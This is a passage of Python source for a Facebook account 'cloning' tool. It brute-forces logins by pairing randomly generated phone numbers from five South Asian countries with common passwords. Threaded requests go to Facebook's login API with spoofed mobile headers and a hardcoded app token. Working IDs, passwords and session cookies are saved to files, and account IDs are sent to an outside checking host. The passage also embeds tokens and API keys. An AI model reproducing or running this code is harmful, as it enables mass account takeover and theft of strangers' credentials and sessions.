                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_MA","client_country_code":"MA",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':baby(),
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;92m|CYBER-OK| '+ids+' | '+pas+'\033[1;97m')
                                                         
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/CYBER_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/CYBER_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                             #   print('\r\r\033[30;1m|CYBER-CP😔| '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CYBER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/CYBER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

#──────────────{ RANDOM }──────────────#
def __Randmx__():
	clear()
	print(f"{A}|1| BANGLADESH CLONING");print(f"{A}|2| INDIA CLONING");print(f"{A}|3| NEPAL CLONING");print(f"{A}|4| PAKISTAN CLONING");print(f"{A}|5| AFGHANISTAN CLONING");linex();option = input(f'{A}|?| CHOICE : ')
	if option in ['A','1']:__bdx__()
	elif option in ['B','2']:__india__()
	elif option in ['C','3']:__nepalx__()
	elif option in ['D','4']:__pakistan__()
	elif option in ['E','5']:__afghanistanx__()
	else:
		print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ RANDOM-BD }──────────────#
def __bdx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 017 / 019 / 016 / 018');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as CYBERx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : +91639 / +98282 / +92627 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as CYBERx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-NEPAL }──────────────#
def __nepalx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 9815 / 9840 / 9814 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as CYBERx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-PAKISTAN }──────────────#
def __pakistan__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : 0306 / 0315 / 0345 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as CYBERx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-AFGHANISTAN }──────────────#
def __afghanistanx__():
    user=[]
    clear()
    print(f'{A}|=| EXAMPLE : +9340 / +9350 / +9330 ');linex();code=input(f'{A}|?| CHOICE  : ')
    clear()
    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{A}|?| CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    for nmbr in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as CYBERx:
        clear()
        tl=str(len(user))
        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-METHOD-M1 }──────────────#
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|CYBER-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': fex(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                                if res == 'LIVE':
                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
                                if res == 'LOCK':
                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
                                elif 'www.facebook.com' in po['error']['message']:
                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
                                else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M2 }──────────────#
def __Randm_M2__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|CYBER-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': fex(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                                if res == 'LIVE':
                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
                                if res == 'LOCK':
                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
                                elif 'www.facebook.com' in po['error']['message']:
                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
                                else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M3 }──────────────#
def __Randm_M3__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|CYBER-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'User-Agent':fex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                                if res == 'LIVE':
                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
                                if res == 'LOCK':
                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
                                elif 'www.facebook.com' in po['error']['message']:
                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
                                else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M4 }──────────────#
def __Randm_M4__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|CYBER-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'User-Agent':fex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\x1b[38;5;46m|CYBER-OK| {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/CYBER-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|CYBER-CP| {str(uid)} | {pas} ')
                                open('/sdcard/CYBER-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#──────────────{ RANDOM-METHOD-M5 }──────────────#
def __Randm_M5__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|CYBER-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers = {'User-Agent':fex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                                if res == 'LIVE':
                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
                                if res == 'LOCK':
                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
                                elif 'www.facebook.com' in po['error']['message']:
                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
                                else:continue
                loop+=1
        except:pass
#──────────────{ END }──────────────#
menu()